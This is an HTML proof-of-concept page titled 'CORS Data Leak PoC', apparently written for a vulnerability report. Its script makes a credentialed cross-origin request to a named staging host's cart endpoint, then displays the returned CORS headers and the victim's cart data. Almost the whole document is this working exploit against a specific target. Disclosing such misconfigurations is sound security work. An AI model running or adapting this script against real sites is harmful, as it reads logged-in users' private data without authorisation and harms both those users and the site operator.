<!DOCTYPE html>
<html>
<head>
  <title>CORS Data Leak PoC</title>
</head>
<body>
  <h2>Exploiting CORS Misconfiguration</h2>
  <p>Status: <span id="status">Attempting to leak data...</span></p>
  <pre id="output" style="background: #f4f4f4; padding: 15px; border: 1px solid #ccc;">Waiting for response...</pre>

  <script>
    const targetUrl = "https://template.uat.foodstorm.com/cart/current";

    fetch(targetUrl, {
      method: "GET",
      mode: "cors", // كان ناقص فاصلة هنا
      credentials: "include",
      headers: {
        "Accept": "application/json"
      }
    })
    .then(response => {
      const allowOrigin = response.headers.get("Access-Control-Allow-Origin");
      const allowCredentials = response.headers.get("Access-Control-Allow-Credentials");

      document.getElementById("output").innerText = 
        "Headers Received:\n" +
        "Access-Control-Allow-Origin: " + allowOrigin + "\n" +
        "Access-Control-Allow-Credentials: " + allowCredentials + "\n\n";

      return response.json();
    })
    .then(data => {
      document.getElementById("status").innerText = "SUCCESS!";
      document.getElementById("output").innerText += "Data:\n" + JSON.stringify(data, null, 2);
    })
    .catch(err => {
      document.getElementById("status").innerText = "FAILED";
      document.getElementById("output").innerText += "Error: " + err.message;
    });
  </script>
</body>
</html>
